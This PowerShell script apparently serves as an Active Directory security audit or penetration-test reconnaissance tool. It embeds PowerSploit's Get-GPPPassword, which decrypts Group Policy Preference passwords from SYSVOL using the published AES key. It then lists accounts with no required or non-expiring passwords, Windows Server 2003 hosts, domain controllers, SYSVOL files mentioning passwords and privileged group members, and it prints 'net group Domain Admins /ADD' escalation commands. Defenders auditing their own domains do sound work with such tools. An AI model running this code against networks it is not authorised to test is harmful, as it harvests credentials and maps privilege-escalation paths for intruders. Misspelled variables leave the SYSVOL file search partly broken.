#determine if ActiveDirectoryModule is available
if (Get-Module -ListAvailable -Name ActiveDirectory) {
    Write-Output "ActiveDirectory module exists - script will proceed."
} 
    elseif (Get-HotFix -Id "KB958830"){
        Write-Output "HotFix `"KB958830`" is installed."
        Write-Output "You must enable the Windows feature to condintue."
        Write-Output "Control Pannel > Programs and Features > Turn Windows features on or off"
        Write-Output "Remote Server Administration Tools > Role Administration Tools"
        Write-Output "AD DS and AD LDS Tools > Active Directory Module for Windows PowerShell"
        exit
    }
        else{
            Write-Output "HotFix `"KB958830`" is required for Remote Server Administration Tools."
            Write-Output "Administrator credentials are required to install and configure."
            Write-Output "Please install KB958830 and enable the RSAT feature to continue."
            exit
   }
    
Import-Module ActiveDirectory

#function Get-GPPPassword finds passwords stored with reversible encryption set by Group Policy
#function found in PowerSploit library
Write-Output "Looking for passwords stored with reversible encryption set by Group Policy."
Write-Output "This can take a few minutes, please be patient." `n
function Get-GPPPassword {
<#
.SYNOPSIS
	Input the entire contents of this file into a PS line, then run Get-GPPPassword
    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 2.4.2
 
.DESCRIPTION

    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.EXAMPLE

    PS C:\> Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml

    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml

    NewName   : [BLANK]
    Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
    Passwords : {password, password1234$}
    UserNames : {administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml

    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {DEMO\Administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml

.EXAMPLE

    PS C:\> Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
    
    password
    password12
    password123
    password1234
    password1234$
    read123
    Recycling*3ftw!

.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
    
    [CmdletBinding()]
    Param ()
    
    #Some XML issues between versions
    Set-StrictMode -Version 2
    
    #define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {
            #Append appropriate padding based on string length  
            $Mod = ($Cpassword.length % 4)
            
            switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    #define helper function to parse fields from xml files
    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            $File 
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            #declare empty arrays
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            #check for password field
            if ($Xml.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($Filename) {

                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }
            
            #put [BLANK] in variables
            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}
                  
            #Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            $ResultsObjectPasswords = $ResultsObject | Select-Object -ExpandProperty Passwords            
            if ($ResultsObjectPasswords -notlike '*[BLANK]*') {Return $ResultsObject} 
                else {return $File + " does not contain any passwords"}
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        #ensure that machine is domain joined and script is running as a domain account
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }
    
        #discover potential files containing passwords ; not complaining in case of denied access to a directory
        Write-Verbose 'Searching the DC. This could take a while.'
        $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
    
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Host "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords." `n"Looking further into files..." `n
            foreach ($File in $XMLFiles) {
                $Result = (Get-GppInnerFields $File.Fullname)
                Write-Output $Result
            }
        }

    catch {Write-Error $Error[0]}
}
 
Get-GPPPassword

function Get-TargetAccounts {
#look for enabled accounts that have the PasswordNotRequired property set
#often times these accounts do not have UPNs
$users = Get-ADUser -Filter * -Property PasswordNotRequired, PasswordNeverExpires 
Write-Output "Looking for enabled accounts that do not require a password."
foreach ($user in $users){
    if($user.Enabled -and $user.PasswordNotRequired){
        [array] $PasswordNotRequiredTargets += $user
    } #close if
} #close foreach
if($PasswordNotRequiredTargets.Count -ne 0){
    Write-Output "The following enabled accounts were found that do not require a password:"
    Write-Output $PasswordNotRequiredTargets | FT Name, SID -AutoSize
} #close if
    else{
        Write-Output "No enabled accounts that do not require a password were found." `n
    } #close else

#look for accounts that have the PasswordNeverExpires property set
Write-Output "Looking for enabled accounts that have non-expiring passwords."
foreach ($user in $users){
    if($user.Enabled -and $user.PasswordNeverExpires){
        [array] $PasswordNeverExpiresTargets += $user
    } #close if
} #close foreach
if($PasswordNeverExpiresTargets.Count -ne 0){
    Write-Output "The following enabled accounts were found that have non-expiring passwords:"
    Write-Output $PasswordNeverExpiresTargets | FT Name, SID -AutoSize
} #close if
    else{          
        Write-Output "No enabled accounts that have non-expiring passwords were found." `n
    } #close else
} # close function

Get-TargetAccounts

#look for Windows Server 2003 servers
function Get-Windows2003Servers{ 
Write-Output "Looking for Windows Server 2003 servers."
$WindowsServer2003Targets = @()
$computers = Get-ADComputer -Filter * -Property OperatingSystem
foreach ($computer in $computers){
    if($computer.OperatingSystem -Like "Windows Server 2003*"){
            $WindowsServer2003Targets += $computer
        }
    }
if($WindowsServer2003Targets.Count -ne 0){
    Write-Output "The following Windows Server 2003 servers were found:"
    Write-Output $WindowsServer2003Targets | FT DNSHostName, OperatingSystem -AutoSize
}
    else{
        Write-Output "No Windows Server 2003 servers found." `n
    }
}

Get-Windows2003Servers

#look for Domain Controllers and output all Domain Controllers noting which ones are on Windows Server 2003
function Get-DomainControllers{
Write-Output "Looking for Domain Controllers."
$DomainControllerTargets = @()
$DomainControllers = Get-ADComputer -Filter * -Properties PrimaryGroupID, OperatingSystem
foreach ($DC in $DomainControllers){
    if($DC.PrimaryGroupId -eq 516){
            $DomainControllerTargets += $DC
    }
} 
Write-Output "The following Domain Controllers were found:"
Write-Output $DomainControllerTargets | FT DNSHostName -AutoSize

#find Domain Controllers on Windows 2003
foreach ($DC in $DomainControllerTargets){
    if($DC.OperatingSystem -like "Windows Server 2003*"){
            $DomainController2003Targets += $DC
        }
    }
if($DomainController2003Targets.Count -ne 0){
    Write-Output "The following Domain Controllers are on Windows Server 2003:"
    Write-Output $DomainController2003Targets | FT DNSHostName, OperatingSystem -AutoSize
}
    else{
        Write-Output "No Domain Controllers on Windows Server 2003 were found." `n
    }
}

Get-DomainControllers

#look in SYSVOL content for passwords; exclude Group Policy files
function Get-InterestingFiles{
Write-Output "Looking for interesting content on Domain Controller SYSVOL shares. Note that the \\<domain controller>\SYSVOL\Policies directory is excluded."
$DomainControllerTargets | foreach-object -begin {$i=0} `
                                          -process {
                                           $i = $i+1;
                                           $path = "\\" + $_.Name + "\SYSVOL";
                                           Write-Progress -Id 1 -Activity "Searching Domain Controllers" -Status "Examining Domaincontroller: $_" -PercentComplete ($i/$DomainControllerTargets.Count*100);
                                           
                                           $files = Get-ChildItem -path $path -recurse -ErrorAction SilentlyContinue -File | Where-Object {$_.PSParentPath -notlike "*Policies*"}                                           
                                           $files | foreach-object -begin {$j=0} `
                                                                   -process {
                                                                    $j = $j+1;
                                                                    Write-Progress -ParentId 1 -Activity "Searching files" -Status "Examining file: $_ " -PercentComplete ($j/$files.Count*100); 
                                                                        if(Get-Content $_.FullName | Select-String -Pattern "password"){
                                                                            [array] $interstingFiles += $_
                                                                        }
                                                                            else{return}
                                                                    }
                                           }

if($interestingFiles.Count -ne 0){
    Write-Output "The following files on the SYSVOL shares contain `"password`" and should be investigated:"
    Write-Output $interstingfiles | FT FullName
}
    else{
        Write-Output "No intersting files found." `n
    }
}

Get-InterestingFiles

#function Get-GroupMemebers retrives the memebers of a given group in Active Directory with the option to search recursively
function Get-GroupMemebers ([string] $groupName, [bool]$recurse) {
if($recurse) {
    [array] $group = Get-ADGroupMember "$groupName" -Recursive
}
    else {
        [array] $group = Get-ADGroupMember "$groupName"
    }
if($group.Count -ne 0){
    Write-Output "$groupName group contains:"
    Write-Output $group | FT name, objectClass, SamAccountName -AutoSize
}
    else{
        Write-Output "$groupName group does not contain any members."
        }
}

Write-Output 'Will now being enumerating accounts that reside in important default AD groups.'

#determine whether or not to recurse nested groups for only users
$response = Read-Host "Would you like to recurse nested groups for all child accounts? (Yes/No)" 
$validResponse = 0 
while($validResponse -eq 0){
    if($response -like 'yes') {
        $recurse = $true
        Write-Output `n"Recursion could take some time, please be patient." `n
        $validResponse = 1        
}
            elseif($response -like 'no'){
            Write-Output `n"No recursion will be done; groups may reside in groups." `n
            $recurse = $false
            $validResponse = 1        
            }

            else{
            Write-Host `n"Please specify 'yes' or 'no'."
            $response = Read-Host "Would you like to recurse nested groups? (Yes/No)"
            }
}

Write-Output 'Members of Administrators are able to elevate to Domain Admins or Enterprise Admins'
Write-Output 'The command "net group "Domain Admins" %username% /DOMAIN /ADD" could be run'
Write-Output 'The command "net group "Enterprise Admins" %username% /DOMAIN /ADD" could be run'
Write-Output 'Ideally this group should only contain Enterprise Admins' `n
Write-Output 'An excelent resource to see escalation paths is: http://www.jasonfilley.com/activedirectorybuiltingroupsselfelevation.html'

[array] $groupsToCheck = @("Administrators",
                           "Domain Admins",
                           "Enterprise Admins",
                           "Account Operators",
                           "Backup Operators",
                           "Print Operators",
                           "Remote Desktop Users",
                           "Server Operators",
                           "Cert Publishers",
                           "DHCP Administrators",
                           "DNSAdmins",
                           "Group Policy Creator Owners")

foreach ($group in $groupsToCheck){
    $groupName = $group
    Get-GroupMemebers $groupName $recurse
}